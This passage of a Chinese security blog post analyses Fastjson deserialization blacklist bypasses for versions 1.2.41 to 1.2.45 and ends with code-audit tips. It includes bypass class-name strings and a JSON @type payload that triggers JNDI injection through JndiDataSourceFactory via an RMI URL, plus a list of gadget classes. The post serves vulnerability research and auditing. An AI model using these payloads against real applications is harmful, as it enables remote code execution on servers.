+<p>在<code>com.alibaba.fastjson.serializer.ObjectArrayCodec</code>通过数组对象的<code>getComponentType()</code>可以获得组成数组元素即<code>com.sun.rowset.JdbcRowSetImpl</code>对象        </p>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-31.15.20.38-image.png" alt="2019-05-31.15.20.38-image.png"></p>
+<p>之后就是去调用<code>JdbcRowSetImpl</code>的set方法触发JDNI注入</p>
+<p>看下<code>getComponentType()</code>用法:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-31.18.13.37-image.png" alt="2019-05-31.18.13.37-image.png"></p>
+<h3 id="V1-2-42"><a href="#V1-2-42" class="headerlink" title="V1.2.42"></a>V1.2.42</h3><p>防护方式就是将<code>denyList</code>改为<code>denyHashCodes</code>方式进行黑名单拦截                    </p>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-31.21.26.33-image.png" alt="2019-05-31.21.26.33-image.png"></p>
+<p><code>HashCode</code>计算比较复杂,相对提高了攻击门槛。用<code>LLcom.sum.rowset.RowSetImpl;;</code>绕过,因为在<code>loadClass()</code>中有递归方法,无论多少次层<code>[ ;</code>,都会去掉</p>
+<h3 id="V1-2-43"><a href="#V1-2-43" class="headerlink" title="V1.2.43"></a>V1.2.43</h3><p>使用上面说的<code>[com.sun.rowset.RowSetImp</code>即可绕过</p>
+<h3 id="V1-2-45"><a href="#V1-2-45" class="headerlink" title="V1.2.45"></a>V1.2.45</h3><p>需要引入第三方包:<br><a href="https://mvnrepository.com/artifact/org.apache.ibatis/ibatis-core" target="_blank" rel="noopener">https://mvnrepository.com/artifact/org.apache.ibatis/ibatis-core</a>            </p>
+<p>用<code>{&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:{&quot;data_source&quot;:&quot;rmi://localhost:1099/Exploit&quot;}}</code>绕过</p>
+<p>很简单,就是<code>setProperties()</code>里调用<code>lookup()</code>,参数<code>data_source</code>可控,造成JNDI注入    </p>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-31.21.09.34-image.png" alt="2019-05-31.21.09.34-image.png"></p>
+<h1 id="Bypass-FastJson"><a href="#Bypass-FastJson" class="headerlink" title="Bypass FastJson"></a>Bypass FastJson</h1><p>Bypass FastJson的思路:                                </p>
+<p>1.找Gadget,其setter()或getter()具有敏感操作<br>2.敏感操作包括:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">JNDI注入(lookup()参数可控)  JdbcRowSetImpl与JndiDataSourceFactory都是这个思路							</span><br><span class="line">newInstance()对象注入   TemplatesImpl		</span><br><span class="line"></span><br><span class="line">class.forname(classname, true, ClassLoaderName) classname与ClassLoaderName可控		  BasicDataSource</span><br><span class="line"></span><br><span class="line">反序列化过程中的map操作,通过equals()触发,可参考JDK7u21漏洞原理。不过这种情况相对复杂,需要对源码很熟悉	</span><br><span class="line"></span><br><span class="line">待补充....</span><br></pre></td></tr></table></figure></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>  Fastjson是Java中处理Json数据的重要组件之一,在实际项目中用的还是比较多的。虽然在最后都是造成了任意命令执行，但是这4种攻击的利用手法是不同的,<code>TemplatesImpl</code>利用的<code>newInstance()</code>进行对象注入,<code>JdbcRowSetImpl</code>与<code>JndiDataSourceFactory</code>利用的是JNDI注入,而<code>BasicDataSource</code>是利用<code>defineClass</code>加载字节码对象。对于FastJson组件来说,我们挖掘的思路就是去寻找存在具有这些敏感操作的<code>getter(),setter()</code>对应的类，即Gadget。</p>
+<p>  另外在对Java Web项目进行代码审计时可以关注:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">parse(jsonStr):JdbcRowSetImpl</span><br><span class="line">parseObject(jsonStr):JdbcRowSetImpl BasicDataSource</span><br><span class="line">parseObject(jsonStr,Object.class):JdbcRowSetImpl</span><br><span class="line"></span><br><span class="line">当开启Feature.SupportNonPublicField时才可利用TemplatesImpl,所以版本必须在1.2.22-1.2.24之间</span><br></pre></td></tr></table></figure></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://xz.aliyun.com/t/2272" target="_blank" rel="noopener">https://xz.aliyun.com/t/2272</a><br><a href="https://laworigin.github.io/2019/03/28/Fastjson-Deserialize-Vulnerability/" target="_blank" rel="noopener">https://laworigin.github.io/2019/03/28/Fastjson-Deserialize-Vulnerability/</a><br><a href="https://p0sec.net/index.php/archives/123/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/123/</a><br><a href="http://xia0yu.win/java/34.html" target="_blank" rel="noopener">http://xia0yu.win/java/34.html</a><br><a href="https://paper.seebug.org/623/#3-fastjson" target="_blank" rel="noopener">https://paper.seebug.org/623/#3-fastjson</a><br><a href="https://kevien.github.io/2018/06/18/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E7%BB%AD)/" target="_blank" rel="noopener">https://kevien.github.io/2018/06/18/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E7%BB%AD)/</a></p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="../../../../index.html">Home</a></li>
+         
+          <li><a href="../../../../about.html">About</a></li>
+         
+          <li><a href="../../../../archives/">Writing</a></li>
+         
+          <li><a href="../../../../friends.html">Friends</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#FastJson反序列化后续"><span class="toc-number">1.</span> <span class="toc-text">FastJson反序列化后续</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BasicDataSource调用链"><span class="toc-number">2.</span> <span class="toc-text">BasicDataSource调用链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前置知识"><span class="toc-number">2.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞成因"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞条件"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.4.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FastJson反序列化1-2-41-1-2-45绕过"><span class="toc-number">3.</span> <span class="toc-text">FastJson反序列化1.2.41-1.2.45绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-41-1-2-45绕过"><span class="toc-number">3.1.</span> <span class="toc-text">1.2.41-1.2.45绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#V1-2-41"><span class="toc-number">3.1.1.</span> <span class="toc-text">V1.2.41</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#V1-2-42"><span class="toc-number">3.1.2.</span> <span class="toc-text">V1.2.42</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#V1-2-43"><span class="toc-number">3.1.3.</span> <span class="toc-text">V1.2.43</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#V1-2-45"><span class="toc-number">3.1.4.</span> <span class="toc-text">V1.2.45</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bypass-FastJson"><span class="toc-number">4.</span> <span class="toc-text">Bypass FastJson</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-number">6.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/06/02/Fatsjson反序列化后续/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/06/02/Fatsjson反序列化后续/&text=FastJson反序列化后续"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/06/02/Fatsjson反序列化后续/&title=FastJson反序列化后续"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/06/02/Fatsjson反序列化后续/&is_video=false&description=FastJson反序列化后续"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=FastJson反序列化后续&body=Check out this article: http://yoursite.com/2019/06/02/Fatsjson反序列化后续/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/06/02/Fatsjson反序列化后续/&title=FastJson反序列化后续"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/06/02/Fatsjson反序列化后续/&title=FastJson反序列化后续"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/06/02/Fatsjson反序列化后续/&title=FastJson反序列化后续"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/06/02/Fatsjson反序列化后续/&title=FastJson反序列化后续"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/06/02/Fatsjson反序列化后续/&name=FastJson反序列化后续&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> 目录</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> 顶部</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> 菜单</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    版权所有 &copy; 2019 P0rZ9
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <li><a href="../../../../index.html">Home</a></li><li><a href="../../../../about.html">About</a></li><li><a href="../../../../archives/">Writing</a></li><li><a href="../../../../friends.html">Friends</a></li>
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="../../../../lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="../../../../lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="../../../../lib/justified-gallery/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+<script src="../../../../lib/jquery/jquery.min.js"></script>
+<script src="../../../../lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="../../../../js/main.js"></script>
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-86660611-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+
